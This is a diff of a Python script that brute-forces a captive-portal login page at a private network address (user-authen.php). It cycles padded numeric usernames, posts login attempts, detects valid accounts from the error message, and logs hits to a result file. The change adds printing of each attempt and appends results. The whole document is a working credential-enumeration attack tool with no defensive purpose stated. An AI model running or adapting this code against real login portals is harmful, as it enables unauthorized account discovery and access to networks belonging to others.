@@ -1,4 +1,4 @@
-import requests, threading, time, random
+import requests
 reqs = requests.session()
 url = "http://172.16.0.1/portal/user-authen.php"
 header = {
@@ -6,14 +6,14 @@ header = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
 }
 def getRun():
-    df = open('username_v2.txt', 'r', encoding='utf-8')
+    df = open('username_v2_status.txt', 'r', encoding='utf-8')
     return df.read()
 def setRun(x):
-    df = open('username_v2.txt', 'w',encoding='utf-8')
+    df = open('username_v2_status.txt', 'w',encoding='utf-8')
     df.writelines(str(x))
     df.close()
 def result(x):
-    df = open('username.txt', 'w',encoding='utf-8')
+    df = open('username_v2_result.txt', 'a',encoding='utf-8')
     df.writelines(str(x))
     df.close()
 def BrutforcePassword(username_main,length):
@@ -25,7 +25,7 @@ def BrutforcePassword(username_main,length):
             if getRun()=='0': return
             if(len(username)==length):
                 isLength = False
-                # print(username)
+                print(username)
             else:
                 username = str(username)+"0"
         body = {
@@ -39,8 +39,7 @@ def BrutforcePassword(username_main,length):
             res = reqs.post(url=url,headers=header,data=body)
             if "Loginname or Password is invalid! (2)" in res.text:
                 print(f"Login is {username}")
-                result(f'usename : {username}')
-                # setRun("0")
+                result(f'usename : {username}\n')
         except:pass
 setRun("1")
 BrutforcePassword("16",6)
